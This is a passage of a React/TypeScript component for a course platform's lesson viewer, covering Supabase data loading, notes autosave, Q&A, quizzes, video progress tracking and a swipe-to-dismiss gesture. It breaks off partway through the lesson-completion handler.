import { useEffect, useState, useCallback, useRef } from "react";
import { useParams, useNavigate, Link } from "react-router-dom";
import { LayoutGroup, motion, useMotionValue, useTransform, animate } from "framer-motion";
import type { AnimationPlaybackControls } from "framer-motion";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/contexts/AuthContext";
import { Button } from "@/components/ui/button";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Textarea } from "@/components/ui/textarea";
import { toast } from "@/lib/toast";
import { cn } from "@/lib/utils";
import DOMPurify from "dompurify";
import {
  CheckCircle2,
  ChevronLeft,
  ChevronRight,
  Download,
  FileText,
  HelpCircle,
  Info,
  ArrowLeft,
  Play,
  PenLine,
  Share2,
  ListVideo,
} from "lucide-react";
import Confetti from "@/components/Confetti";
import { checkMilestone } from "@/hooks/useMilestone";
import { useVideoProgress } from "@/hooks/useVideoProgress";
import { checkAndGenerateCertificate } from "@/hooks/useCertificateAutoGenerate";
import { hapticImpact, hapticNotification, tapTick, celebrate } from "@/lib/haptics";
import { useMotionSafe } from "@/lib/motion";
import type { Chapter, Resource, QnaItem, QnaReply } from "@/components/chapter/types";
import QuizBlock from "@/components/chapter/QuizBlock";
import ChapterMediaPlayer from "@/components/chapter/ChapterMediaPlayer";
import AmbientGlow from "@/components/media/AmbientGlow";
import UpNextList from "@/components/chapter/UpNextList";
import CompletionTakeover from "@/components/chapter/CompletionTakeover";
import { CompletionRecap } from "@/components/progress/CompletionRecap";
import { ProgressRing } from "@/components/progress/ProgressRing";
import ChapterQna from "@/components/chapter/ChapterQna";

// The staged completion arc: the course ring animates in place, THEN the
// takeover enters, THEN (once the takeover has fully exited) the recap follows
// — one overlay on screen at a time. `idle` is the resting state.
// `recapOut` is the recap's mirror of `recapWait`: dismissing the recap flips
// it to `recapOut` (which closes the recap so AnimatePresence can play the
// glide-out exit) and navigation is deferred to the recap's `onExited`, once
// that exit has fully played. Navigating straight from the dismiss handler
// would unmount the portal synchronously and the exit would never run.
type ArcPhase = "idle" | "takeover" | "recapWait" | "recap" | "recapOut";

// Generic section titles that carry no real "module" context — the auto-created
// single-bucket names a course gets when it has no authored modules. When the
// current section resolves to one of these (or the course has a single section),
// the module label is suppressed rather than shown as junk context.
const PLACEHOLDER_MODULE_TITLES = new Set([
  "course episodes",
  "episodes",
  "lessons",
  "all lessons",
  "content",
  "untitled",
  "untitled section",
  "default section",
  "section 1",
]);

/**
 * The module label to show in the Up Next momentum line, or null to suppress it.
 * Suppressed when the course has a single section (no true modules) or when that
 * section's title is a generic placeholder — either way there's no meaningful
 * module to name.
 */
const moduleLabelFor = (
  sectionCount: number,
  sectionTitle: string | null | undefined,
): string | null => {
  const title = sectionTitle?.trim();
  if (!title || sectionCount <= 1) return null;
  if (PLACEHOLDER_MODULE_TITLES.has(title.toLowerCase())) return null;
  return title;
};

// The chapter sidebar tab strip. Radix Tabs (via the shadcn wrapper) already
// implements the full WAI-ARIA tabs contract — role=tablist/tab/tabpanel,
// aria-selected, roving tabindex and arrow/Home/End keyboard nav — so we drive
// it CONTROLLED and layer a sliding cream pill (framer `layoutId`, glide spring)
// over the active trigger, mirroring Learn's phase-1 segmented-control pattern.
const CHAPTER_TABS = [
  { key: "upnext", label: "Up Next" },
  { key: "notes", label: "Notes" },
  { key: "overview", label: "Overview" },
  { key: "resources", label: "Files" },
  { key: "qna", label: "Q&A" },
] as const;
type ChapterTab = (typeof CHAPTER_TABS)[number]["key"];

const TAB_ICONS: Record<ChapterTab, typeof Play> = {
  upnext: Play,
  notes: PenLine,
  overview: Info,
  resources: FileText,
  qna: HelpCircle,
};

const ChapterViewer = () => {
  const { chapterId } = useParams<{ chapterId: string }>();
  const navigate = useNavigate();
  const { user, profile } = useAuth();

  const motionSafe = useMotionSafe();

  const [chapter, setChapter] = useState<Chapter | null>(null);
  const [courseId, setCourseId] = useState<string | null>(null);
  const [courseTitle, setCourseTitle] = useState<string | null>(null);
  // Section/module title of the current chapter, for the Up Next momentum
  // context line ("Lesson N of M · Module X"). Derived from the sections rows
  // loadChapter already fetches — no extra query.
  const [currentModuleTitle, setCurrentModuleTitle] = useState<string | null>(null);
  // Controlled tab value so the sliding pill knows the active segment and so a
  // Q&A refresh (or any re-render) never snaps the strip back to a default tab.
  const [activeTab, setActiveTab] = useState<ChapterTab>("upnext");
  // The public offering slug for this chapter's course. Share links use
  // this so recipients land on the marketing/buy page (not on a paywalled
  // chapter URL that would bounce them straight to login).
  const [offeringSlug, setOfferingSlug] = useState<string | null>(null);
  const [siblings, setSiblings] = useState<{
    id: string;
    title: string;
    duration_seconds: number | null;
    content_type: string;
    thumbnail_url: string | null;
    vdocipher_thumbnail_url: string | null;
    description: string | null;
  }[]>([]);
  const [currentIndex, setCurrentIndex] = useState(0);
  const [isCompleted, setIsCompleted] = useState(false);
  const [resources, setResources] = useState<Resource[]>([]);
  const [qna, setQna] = useState<QnaItem[]>([]);
  const [questionText, setQuestionText] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [loading, setLoading] = useState(true);
  const [accessDenied, setAccessDenied] = useState(false);
  const [qnaLimit, setQnaLimit] = useState(20);
  const [notes, setNotes] = useState("");
  const [notesSavedAt, setNotesSavedAt] = useState<number | null>(null);
  const [milestone, setMilestone] = useState<{ pct: number; title: string; subtitle: string } | null>(null);
  const [showConfetti, setShowConfetti] = useState(false);
  // Completion-arc phase. Replaces the old single `showCompletionBanner` bool
  // so the takeover and recap can be sequenced (never stacked).
  const [arcPhase, setArcPhase] = useState<ArcPhase>("idle");
  // Course-level momentum for the in-place ring: the needle sits at the
  // current course % and springs to its new value the moment a lesson
  // completes, BEFORE the takeover enters. Also feeds the recap's stats.
  const [courseCompleted, setCourseCompleted] = useState(0);
  const [courseTotal, setCourseTotal] = useState(0);
  const [courseWatchMinutes, setCourseWatchMinutes] = useState(0);
  const [courseInstructor, setCourseInstructor] = useState<string | null>(null);
  const [courseHeroImage, setCourseHeroImage] = useState<string | null>(null);
  const [quizzes, setQuizzes] = useState<any[]>([]);

  const confettiTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const autoAdvanceTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  // The beat between the ring settling and the takeover entering.
  const arcTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  const coursePct =
    courseTotal > 0 ? Math.round((courseCompleted / courseTotal) * 100) : 0;

  const { updateProgress, lastPosition } = useVideoProgress(chapterId, courseId, user?.id);

  // ── Swipe-down-to-dismiss (T3) ──────────────────────────────────────────
  // A Netflix-style drag on the APP-OWNED chrome (the sticky header / grab
  // handle — never over the cross-origin player iframe) glides the whole
  // screening-room surface off the bottom and returns to the course. The
  // pointer handlers live ONLY on the thin sticky top bar, so page scroll over
  // the rest of the screening room — the player, notes, up-next, everything
  // below the bar — is untouched. The bar itself carries `touch-action: none`
  // (see the render site), which makes the JS drag the sole owner of a vertical
  // pull that BEGINS on it: this is a deliberate grab-handle tradeoff — a pull
  // starting on the bar drives the dismiss rather than native scroll (an upward
  // pull on the bar does NOT scroll the page), exactly as a drag handle is
  // expected to behave. The transform is applied ONLY while the gesture is live
  // (`dragActive`), so the page carries no permanent composited layer — matching
  // the Android WebView compositing budget. Reduced motion disables the drag
  // entirely (and drops `touch-action: none`, restoring native touch on the
  // bar); the back button remains the intact close affordance.
  const DISMISS_THRESHOLD = 130; // px pulled down past which release dismisses.
  const dismissY = useMotionValue(0);
  const dismissScale = useTransform(dismissY, [0, 400], [1, 0.94], { clamp: true });
  // Dim feedback rides a single flat scrim layer, NOT the subtree's own opacity.
  // An ancestor `opacity < 1` forces the browser to flatten the whole surface —
  // the live player iframe, the backdrop-blurred header and the AmbientGlow blur
  // — into a group-opacity offscreen buffer and re-composite it EVERY frame,
  // which is the mid-range Android WebView jank source. A flat-colour scrim whose
  // opacity animates is the canonical cheap case (composited, no re-raster). The
  // 0→0.18 range darkens the surface to roughly the old 0.82 perceived level at
  // the far end of the pull, so the feel is preserved.
  const dismissScrim = useTransform(dismissY, [0, 400], [0, 0.18], { clamp: true });
  const [dragActive, setDragActive] = useState(false);
  // Live gesture bookkeeping. `candidate` is set on pointer-down and only
  // promotes to `dragging` once a clear downward intent is seen, so a tap on
  // the back button is never swallowed.
  const dragStateRef = useRef<{
    startX: number;
    startY: number;
    pointerId: number;
    dragging: boolean;
    candidate: boolean;
  } | null>(null);
  // Set right after a real drag so the trailing click (which would otherwise
  // fire the header's back button) is swallowed in the capture phase.
  const didDragRef = useRef(false);
  // The in-flight settle/dismiss spring (framer `animate()` controls). Held so a
  // re-grab can `.stop()` it: `motionValue.set()` does NOT cancel a running
  // animation driver, so without this a fresh drag during the spring-back fights
  // the still-running spring frame-by-frame, and the settle's onComplete would
  // flip `dragActive` off mid-gesture (unbinding the transform). Making the
  // gesture interruptible is an explicit T3 requirement.
  const dragAnimRef = useRef<AnimationPlaybackControls | null>(null);

  const dismissTarget = courseId ? `/courses/${courseId}` : "/home";

  const onHeaderPointerDown = (e: React.PointerEvent<HTMLDivElement>) => {
    if (motionSafe.reduced) return; // no drag theatrics under reduced motion
    if (e.pointerType === "mouse" && e.button !== 0) return;
    dragStateRef.current = {
      startX: e.clientX,
      startY: e.clientY,
      pointerId: e.pointerId,
      dragging: false,
      candidate: true,
    };
  };

  const onHeaderPointerMove = (e: React.PointerEvent<HTMLDivElement>) => {
    const s = dragStateRef.current;
    if (!s || !s.candidate) return;
    const dx = e.clientX - s.startX;
    const dy = e.clientY - s.startY;
    if (!s.dragging) {
      // Promote to a drag only on a decisively downward pull; a horizontal or
      // upward move bails so native scroll / horizontal gestures win.
      if (dy > 8 && dy > Math.abs(dx)) {
        // Pointer capture is REQUIRED here, not a nicety. As the finger travels
        // down it crosses over the cross-origin player iframe (VdoCipher /
        // Vimeo / YouTube), and pointer events neither bubble nor dispatch
        // across that origin boundary — capture is the ONLY thing that keeps
        // every pointermove/up on this header so `endHeaderDrag` can fire and
        // clear `dragActive`/`dismissY`. So attempt capture FIRST: if it's
        // unavailable (rare/old WebView), we must NOT start a drag we can't
        // finish — continuing would wedge the surface mid-dismiss with
        // `dragActive` stuck true and no path to reset. In that case we bail
        // cleanly and leave the back button as the working close affordance.
        let captured = false;
        try {
          e.currentTarget.setPointerCapture(s.pointerId);
          captured = true;
        } catch {
          captured = false;
        }
        if (!captured) {
          s.candidate = false; // abort — degrade to the back-button close path
          return;
        }
        s.dragging = true;
        // Interrupt any in-flight settle/dismiss spring so the finger takes
        // over cleanly instead of racing it (and so its onComplete — which
        // would drop `dragActive` — never fires against this live gesture).
        dragAnimRef.current?.stop();
        dragAnimRef.current = null;
        setDragActive(true);
      } else if (Math.abs(dx) > 8 && Math.abs(dx) > dy) {
        s.candidate = false;
      }
      return;
    }
    dismissY.set(Math.max(0, dy));
  };

  const endHeaderDrag = (e: React.PointerEvent<HTMLDivElement>) => {
    const s = dragStateRef.current;
    dragStateRef.current = null;
    if (!s || !s.dragging) return; // a tap → let the click through untouched
    didDragRef.current = true;
    try {
      e.currentTarget.releasePointerCapture(s.pointerId);
    } catch {
      /* nothing captured */
    }
    if (dismissY.get() > DISMISS_THRESHOLD) {
      // Past threshold: glide off the bottom, then navigate back to the course.
      const h = typeof window !== "undefined" ? window.innerHeight : 800;
      dragAnimRef.current = animate(dismissY, h, {
        ...motionSafe.springs.glide,
        onComplete: () => {
          dragAnimRef.current = null;
          navigate(dismissTarget);
        },
      });
    } else {
      // Released short: spring back, then drop the transform layer — but only
      // if no fresh drag has re-grabbed the surface in the meantime (a re-grab
      // stops this animation, so onComplete normally won't fire; the guard
      // covers the natural-completion race just before a promote).
      dragAnimRef.current = animate(dismissY, 0, {
        ...motionSafe.springs.glide,
        onComplete: () => {
          dragAnimRef.current = null;
          if (!dragStateRef.current?.dragging) setDragActive(false);
        },
      });
    }
  };

  const onHeaderClickCapture = (e: React.MouseEvent<HTMLDivElement>) => {
    if (didDragRef.current) {
      e.stopPropagation();
      e.preventDefault();
      didDragRef.current = false;
    }
  };

  // Clean up confetti, auto-advance and arc timers on unmount. A route change
  // mid-arc therefore drops the pending takeover instead of firing it against
  // an unmounted tree; the takeover's own effect cleanup restores body scroll.
  useEffect(() => {
    return () => {
      if (confettiTimerRef.current) clearTimeout(confettiTimerRef.current);
      if (autoAdvanceTimerRef.current) clearTimeout(autoAdvanceTimerRef.current);
      if (arcTimerRef.current) clearTimeout(arcTimerRef.current);
    };
  }, []);

  // NOTE: the completion flow's body-scroll lock is owned SOLELY by
  // <CompletionTakeover> (rendered open={arcPhase === "takeover"} below). Do NOT
  // add a second lock here or in <CompletionRecap>: two effects both
  // capturing/restoring body.style.overflow race on React's child-before-parent
  // ordering — the outer one captures the child's "hidden" and re-applies it on
  // cleanup, wedging the whole app unscrollable after a course is finished. One
  // owner only. The recap sequences AFTER the takeover exits, so it never needs
  // its own lock (it's a full-screen `fixed inset-0` portal regardless).
  const loadChapter = useCallback(async () => {
    if (!chapterId || !user) return;
    setLoading(true);
    // Clear any stale access-denied state from a previous chapter so a
    // switch from a locked lesson to an accessible one doesn't flash the
    // "Enrolment required" screen while the new fetch is in flight.
    setAccessDenied(false);
    // Reset the module context line so a chapter switch never shows the
    // previous lesson's module while the new sections load.
    setCurrentModuleTitle(null);

    // Fetch chapter
    const { data: ch, error } = await supabase
      .from("chapters")
      .select("*")
      .eq("id", chapterId)
      .maybeSingle();

    if (error || !ch) {
      toast.error("We couldn't find that lesson.");
      navigate("/home");
      return;
    }

    setChapter(ch as Chapter);

    // Get course_id from section
    const { data: sec } = await supabase
      .from("sections")
      .select("course_id")
      .eq("id", ch.section_id)
      .maybeSingle();

    const cid = sec?.course_id;
    setCourseId(cid || null);

    // Fetch course title for breadcrumb + the course's public offering
    // slug so the Share button can deep-link recipients to the buy page
    // instead of the gated chapter URL.
    if (cid) {
      const { data: courseData } = await supabase
        .from("courses")
        .select("title, primary_offering_id, instructor_display_name, hero_image_url")
        .eq("id", cid)
        .maybeSingle();
      setCourseTitle(courseData?.title || null);
      // Instructor + hero feed the completion recap that closes out the arc.
      setCourseInstructor(courseData?.instructor_display_name ?? null);
      setCourseHeroImage(courseData?.hero_image_url ?? null);

      // Prefer the course's primary offering. If that's unset, fall
      // through to any offering that lists this course - we just need
      // a working public landing page to share.
      let resolvedSlug: string | null = null;
      if (courseData?.primary_offering_id) {
        const { data: off } = await supabase
          .from("offerings")
          .select("slug")
          .eq("id", courseData.primary_offering_id)
          // Resolve slug for active OR archived offerings; legacy
          // enrolees on archived programs still need the "Back to
          // offering" link from inside ChapterViewer to work.
          .in("status", ["active", "archived"])
          .maybeSingle();
        resolvedSlug = off?.slug ?? null;
      }
      if (!resolvedSlug) {
        // Two-step lookup instead of a PostgREST embed - more robust
        // against FK ambiguity, and the offerings table has a tiny row
        // count so the extra round-trip is negligible.
        const { data: ocs } = await supabase
          .from("offering_courses")
          .select("offering_id")
          .eq("course_id", cid);
        const offeringIds = ((ocs ?? []) as any[])
          .map((r) => r.offering_id)
          .filter(Boolean);
        if (offeringIds.length > 0) {
          const { data: offs } = await supabase
            .from("offerings")
            .select("slug, is_public, status")
            .in("id", offeringIds)
            .in("status", ["active", "archived"]);
          // Prefer active offerings for the canonical back-link; fall
          // back to an archived one if this course only has archived
          // offerings (e.g. legacy TagMango program with no successor).
          const publicOnes = ((offs ?? []) as any[]).filter((o) => o.is_public !== false);
          const active = publicOnes.find((o) => o.status === "active");
          resolvedSlug = (active ?? publicOnes[0])?.slug ?? null;
        }
      }
      setOfferingSlug(resolvedSlug);
    }

    // Access check: if not free, verify access before rendering content
    if (!ch.make_free && cid) {
      const isAdmin = profile?.role === "admin";
      if (!isAdmin) {
        const { data: access } = await supabase.rpc("has_course_access", {
          p_course_id: cid,
        });
        if (!access) {
          setAccessDenied(true);
          setLoading(false);
          return;
        }
      }
    }
    setAccessDenied(false);

    // Load all chapter siblings in same course for nav
    if (cid) {
      const { data: allSections } = await supabase
        .from("sections")
        .select("id, sort_order, title")
        .eq("course_id", cid)
        .order("sort_order");

      if (allSections && allSections.length > 0) {
        // Module context for the Up Next momentum line: the title of the
        // section this chapter lives in. Uses the rows we already fetched.
        // Suppressed for single-section courses / placeholder bucket titles so
        // the line never surfaces junk context like "COURSE EPISODES".
        setCurrentModuleTitle(
          moduleLabelFor(
            allSections.length,
            allSections.find((s) => s.id === ch.section_id)?.title,
          ),
        );
        const sectionIds = allSections.map((s) => s.id);
        const { data: allChapters } = await supabase
          .from("chapters")
          .select("id, title, section_id, sort_order, duration_seconds, content_type, thumbnail_url, vdocipher_thumbnail_url, description")
          .in("section_id", sectionIds)
          .order("sort_order");

        if (allChapters) {
          // Sort by section order then chapter order
          const sectionOrder = new Map(allSections.map((s, i) => [s.id, i]));
          const sorted = allChapters.sort((a, b) => {
            const sa = sectionOrder.get(a.section_id) ?? 0;
            const sb = sectionOrder.get(b.section_id) ?? 0;
            return sa !== sb ? sa - sb : a.sort_order - b.sort_order;
          });
          setSiblings(sorted.map((c) => ({
            id: c.id,
            title: c.title,
            duration_seconds: c.duration_seconds,
            content_type: c.content_type,
            thumbnail_url: c.thumbnail_url,
            vdocipher_thumbnail_url: (c as any).vdocipher_thumbnail_url ?? null,
            description: c.description,
          })));
          setCurrentIndex(sorted.findIndex((c) => c.id === chapterId));
          // Total lessons in the course — the ring's denominator.
          setCourseTotal(sorted.length);
        }
      }
    }

    // Load progress, resources, qna in parallel
    const [progressRes, resourcesRes, qnaRes] = await Promise.all([
      supabase
        .from("chapter_progress")
        .select("completed_at")
        .eq("chapter_id", chapterId)
        .eq("user_id", user.id)
        .maybeSingle(),
      supabase
        .from("chapter_resources")
        .select("id, filename, file_url, file_size_bytes")
        .eq("chapter_id", chapterId)
        .order("sort_order"),
      supabase
        .from("chapter_qna")
        .select("id, question_text, user_id, is_resolved, created_at")
        .eq("chapter_id", chapterId)
        .order("created_at", { ascending: false }),
    ]);

    setIsCompleted(!!progressRes.data?.completed_at);

    // Course-wide progress for the in-place ring's starting position and the
    // recap's stats (lessons finished + watch minutes). Separate from the
    // per-chapter fetch above so its typed rows stay clean.
    if (cid) {
      const { data: courseProg } = await supabase
        .from("chapter_progress")
        .select("completed_at, last_position_seconds")
        .eq("course_id", cid)
        .eq("user_id", user.id);
      const rows = courseProg || [];
      setCourseCompleted(rows.filter((p) => p.completed_at).length);
      setCourseWatchMinutes(
        Math.round(
          rows.reduce((sum, p) => sum + (p.last_position_seconds || 0), 0) / 60,
        ),
      );
    }
    setResources((resourcesRes.data || []) as Resource[]);

    // Batch-fetch all QnA replies (fixes N+1 sequential query issue)
    const qnaItems = (qnaRes.data || []) as any[];
    const qnaIds = qnaItems.map((q) => q.id);
    let allReplies: any[] = [];
    if (qnaIds.length > 0) {
      const { data: repliesData } = await supabase
        .from("chapter_qna_replies")
        .select("id, reply_text, user_id, is_instructor_reply, created_at, qna_id")
        .in("qna_id", qnaIds)
        .order("created_at");
      allReplies = repliesData || [];
    }
    const repliesByQna: Record<string, QnaReply[]> = {};
    allReplies.forEach((r: any) => {
      if (!repliesByQna[r.qna_id]) repliesByQna[r.qna_id] = [];
      repliesByQna[r.qna_id].push(r);
    });

    // Batch-fetch user names for QnA and replies
    const allUserIds = new Set<string>();
    qnaItems.forEach((q: any) => allUserIds.add(q.user_id));
    allReplies.forEach((r: any) => allUserIds.add(r.user_id));
    let userNameMap: Record<string, string> = {};
    if (allUserIds.size > 0) {
      // public_user_profiles is the column-safe view introduced in
      // 20260417100000_foundation_hardening.sql. We use it instead of
      // querying the users table directly because users RLS only
      // exposes the caller's own row to non-admins; the view exposes
      // id/full_name/avatar_url/member_number/occupation for every
      // authenticated peer (no email/phone/bio/city).
      const { data: users } = await supabase
        .from("public_user_profiles" as any).select("id, full_name").in("id", [...allUserIds]);
      ((users as any[]) || []).forEach((u: any) => { userNameMap[u.id] = u.full_name || "Anonymous"; });
    }

    const qnaWithReplies: QnaItem[] = qnaItems.map((q) => ({
      ...q,
      user_name: userNameMap[q.user_id] || "Anonymous",
      replies: (repliesByQna[q.id] || []).map((r: any) => ({
        ...r,
        user_name: userNameMap[r.user_id] || "Anonymous",
      })),
    }));
    setQna(qnaWithReplies);

    // Fetch quizzes for this chapter. Options come from `quiz_options_public`
    // a view that never exposes `is_correct`. Scoring moved to the
    // `submit_quiz` RPC (see migration 20260417120000) so students can no
    // longer read the answer key.
    const { data: quizData } = await (supabase as any)
      .from("chapter_quizzes")
      .select("id, title, description, pass_percentage, sort_order, quiz_questions(id, question_text, question_type, explanation, sort_order)")
      .eq("chapter_id", chapterId)
      .eq("is_active", true)
      .order("sort_order");

    if (quizData && quizData.length) {
      const allQuestionIds: string[] = quizData.flatMap((q: any) =>
        (q.quiz_questions || []).map((qq: any) => qq.id)
      );
      if (allQuestionIds.length) {
        const { data: opts } = await (supabase as any)
          .from("quiz_options_public")
          .select("id, question_id, option_text, sort_order")
          .in("question_id", allQuestionIds)
          .order("sort_order");
        const byQuestion: Record<string, any[]> = {};
        (opts || []).forEach((o: any) => {
          if (!byQuestion[o.question_id]) byQuestion[o.question_id] = [];
          byQuestion[o.question_id].push(o);
        });
        quizData.forEach((q: any) => {
          (q.quiz_questions || []).forEach((qq: any) => {
            qq.quiz_options = byQuestion[qq.id] || [];
          });
        });
      }
      setQuizzes(quizData);
    } else {
      setQuizzes([]);
    }

    setLoading(false);
  }, [chapterId, user, profile, navigate]);

  useEffect(() => {
    loadChapter();
  }, [loadChapter]);

  // Notes load - DB-backed via chapter_notes (one row per user per chapter).
  // On mount we read the DB row; if it doesn't exist but localStorage still
  // has a v1-era note for this chapter we upload it once and clear the
  // local copy so the two stores can't drift.
  const notesHydratedRef = useRef(false);
  useEffect(() => {
    if (!chapterId || !user) return;
    let cancelled = false;
    notesHydratedRef.current = false;
    (async () => {
      const { data } = await supabase
        .from("chapter_notes")
        .select("body")
        .eq("user_id", user.id)
        .eq("chapter_id", chapterId)
        .maybeSingle();
      if (cancelled) return;

      let initial = data?.body ?? "";
      // Legacy localStorage migration: if no DB row exists yet but a
      // v1 note is still in localStorage, push it to the DB and wipe
      // the local copy. Idempotent because subsequent loads see the
      // DB row and skip this branch.
      if (!data) {
        const legacyKey = `levelup:notes:${user.id}:${chapterId}`;
        let legacy: string | null = null;
        try { legacy = localStorage.getItem(legacyKey); } catch { /* ignored */ }
        if (legacy) {
          await supabase.from("chapter_notes").upsert(
            { user_id: user.id, chapter_id: chapterId, body: legacy },
            { onConflict: "user_id,chapter_id" }
          );
          try { localStorage.removeItem(legacyKey); } catch { /* ignored */ }
          initial = legacy;
        }
      }
      if (cancelled) return;
      setNotes(initial);
      setNotesSavedAt(null);
      // Hydration done - the autosave effect below can now persist user
      // edits without misreading the initial load as a user change.
      notesHydratedRef.current = true;
    })();
    return () => { cancelled = true; };
  }, [chapterId, user]);

  // Hold the live notes string in a ref so the unmount/chapter-switch
  // flush below can read the latest value without going stale on the
  // captured closure.
  const notesRef = useRef("");
  notesRef.current = notes;

  // Debounced autosave - upserts the (user_id, chapter_id) row whenever
  // the textarea content changes after hydration completes.
  useEffect(() => {
    if (!chapterId || !user) return;
    if (!notesHydratedRef.current) return;
    const t = setTimeout(async () => {
      try {
        if (notes) {
          const { error } = await supabase.from("chapter_notes").upsert(
            { user_id: user.id, chapter_id: chapterId, body: notes },
            { onConflict: "user_id,chapter_id" }
          );
          if (!error) setNotesSavedAt(Date.now());
        } else {
          // Empty textarea - delete the row so the DB doesn't keep
          // empty notes hanging around. Only signal "Saved" if there
          // was actually a row to delete.
          const { error, count } = await supabase
            .from("chapter_notes")
            .delete({ count: "exact" })
            .eq("user_id", user.id)
            .eq("chapter_id", chapterId);
          if (!error && (count ?? 0) > 0) setNotesSavedAt(Date.now());
        }
      } catch {
        // Offline or network blip - notes stay in component state
        // and we'll retry on the next change. We deliberately don't
        // toast every save failure; the user sees the absence of
        // the "Saved" tag instead.
      }
    }, 600);
    return () => clearTimeout(t);
  }, [notes, chapterId, user]);

  // Flush on unmount or chapter switch. The debounced effect above
  // clears its timer on cleanup, which means the last ~600ms of
  // typing would be lost when the user navigates away mid-edit.
  // This effect fires a fire-and-forget save with the latest value
  // from the ref so nothing gets clipped. We don't need to set
  // notesSavedAt here - the component is gone.
  useEffect(() => {
    return () => {
      if (!notesHydratedRef.current) return;
      if (!chapterId || !user) return;
      const finalNotes = notesRef.current;
      if (finalNotes) {
        void supabase.from("chapter_notes").upsert(
          { user_id: user.id, chapter_id: chapterId, body: finalNotes },
          { onConflict: "user_id,chapter_id" }
        );
      } else {
        void supabase
          .from("chapter_notes")
          .delete()
          .eq("user_id", user.id)
          .eq("chapter_id", chapterId);
      }
    };
  }, [chapterId, user]);

  // Lightweight refresh for Q&A only, used after posting a question so we don't
  // unmount the whole page (which would flash the loader and reset the Tabs back
  // to Overview, especially disruptive on mobile).
  const refreshQna = useCallback(async () => {
    if (!chapterId) return;
    const { data: qnaData } = await supabase
      .from("chapter_qna")
      .select("id, question_text, user_id, is_resolved, created_at")
      .eq("chapter_id", chapterId)
      .order("created_at", { ascending: false });
    const qnaItems = (qnaData || []) as any[];
    const qnaIds = qnaItems.map((q) => q.id);
    let allReplies: any[] = [];
    if (qnaIds.length > 0) {
      const { data: repliesData } = await supabase
        .from("chapter_qna_replies")
        .select("id, reply_text, user_id, is_instructor_reply, created_at, qna_id")
        .in("qna_id", qnaIds)
        .order("created_at");
      allReplies = repliesData || [];
    }
    const repliesByQna: Record<string, QnaReply[]> = {};
    allReplies.forEach((r: any) => {
      if (!repliesByQna[r.qna_id]) repliesByQna[r.qna_id] = [];
      repliesByQna[r.qna_id].push(r);
    });
    const userIds = new Set<string>();
    qnaItems.forEach((q: any) => userIds.add(q.user_id));
    allReplies.forEach((r: any) => userIds.add(r.user_id));
    const userNameMap: Record<string, string> = {};
    if (userIds.size > 0) {
      // Use the RLS-safe public_user_profiles view (same as loadChapter),
      // NOT the users table; the users RLS restricts non-admins to their
      // own row, so querying it here collapses every OTHER author's name
      // to "Anonymous" right after a student posts a question.
      const { data: users } = await supabase
        .from("public_user_profiles" as any).select("id, full_name").in("id", [...userIds]);
      (users || []).forEach((u: any) => { userNameMap[u.id] = u.full_name || "Anonymous"; });
    }
    setQna(qnaItems.map((q) => ({
      ...q,
      user_name: userNameMap[q.user_id] || "Anonymous",
      replies: (repliesByQna[q.id] || []).map((r: any) => ({
        ...r,
        user_name: userNameMap[r.user_id] || "Anonymous",
      })),
    })));
  }, [chapterId]);

  // Listen for YouTube / Vimeo / generic iframe progress messages
  useEffect(() => {
    const handler = (event: MessageEvent) => {
      try {
        const data = typeof event.data === "string" ? JSON.parse(event.data) : event.data;

        // YouTube IFrame API sends infoDelivery with playerState and currentTime
        if (data?.event === "infoDelivery" && data?.info?.currentTime !== undefined) {
          updateProgress(
            Math.floor(data.info.currentTime),
            Math.floor(data.info.duration || 0)
          );
          return;
        }

        // Vimeo player.js sends events with method "timeupdate"
        if (data?.method === "timeupdate" && data?.value?.seconds !== undefined) {
          updateProgress(
            Math.floor(data.value.seconds),
            Math.floor(data.value.duration || 0)
          );
          return;
        }

        // Generic fallback: any message with currentTime
        if (data?.currentTime !== undefined) {
          updateProgress(
            Math.floor(data.currentTime),
            Math.floor(data.duration || 0)
          );
        }
      } catch {
        // ignore non-JSON messages
      }
    };
    window.addEventListener("message", handler);
    return () => window.removeEventListener("message", handler);
  }, [updateProgress]);

  const handleShare = async () => {
    if (!chapter) return;
    // Share the offering's public buy page when we have it - recipients
    // without access can read about the program and purchase, then
    // start watching. Only fall back to the chapter URL if no public
    // offering links to this course (an unlikely but defensive case).
    const url = offeringSlug
      ? `${window.location.origin}/p/${offeringSlug}`
      : window.location.href;
    const title = courseTitle || chapter.title;
    if (typeof navigator !== "undefined" && (navigator as any).share) {
      try {
        await (navigator as any).share({ url, title });
        return;
      } catch {
        // User cancelled, or share unavailable; fall through to clipboard.
      }
    }
    try {
      await navigator.clipboard.writeText(url);
      toast.success("Link copied");
    } catch {
      toast.error("Couldn't copy the link. Try again.");
    }
  };

  const handleMarkComplete = async () => {
    if (!user || !chapterId || !courseId) return;
    setSubmitting(true);

    const { error } = await supabase.from("chapter_progress").upsert(
      {
        user_id: user.id,
        chapter_id: chapterId,
        course_id: courseId,
        completed_at: new Date().toISOString(),
        started_at: new Date().toISOString(),
      },
      { onConflict: "user_id,chapter_id" }
    );

    if (error) {
      // Fallback: insert if upsert fails (no unique constraint)
      await supabase.from("chapter_progress").insert({
        user_id: user.id,
        chapter_id: chapterId,
        course_id: courseId,
        completed_at: new Date().toISOString(),
        started_at: new Date().toISOString(),
      });
    }

    setIsCompleted(true);
    setSubmitting(false);
    hapticImpact("light");

    // Check for milestone (progress celebration)
    const { data: allProgress } = await supabase
      .from("chapter_progress")
      .select("chapter_id, completed_at")
      .eq("user_id", user.id)
      .eq("course_id", courseId);
    const completedRows = (allProgress || []).filter((p) => p.completed_at);

    // Authoritative chapter total for milestone/certificate maths. The
    // `siblings` state can be empty if its fetch failed or raced a chapter
    // switch, and the old `siblings.length || 1` fallback made completing
    // ANY chapter look like 100% course completion. Count chapters via the
    // sections join instead, and skip the celebration logic entirely when
    // the count can't be established.
    let totalCount: number | null = null;
    let liveChapterIds: Set<string> | null = null;
    const { data: secRows, error: secErr } = await supabase
      .from("sections")
      .select("id")
      .eq("course_id", courseId);
    if (!secErr && secRows) {
      const sectionIds = secRows.map((s) => s.id);
      if (sectionIds.length === 0) {
        totalCount = 0;
        liveChapterIds = new Set();
      } else {
        const { data: chapRows, error: countErr } = await supabase
          .from("chapters")
          .select("id")
          .in("section_id", sectionIds);
        if (!countErr && chapRows) {
          liveChapterIds = new Set(chapRows.map((c) => c.id));
          totalCount = chapRows.length;
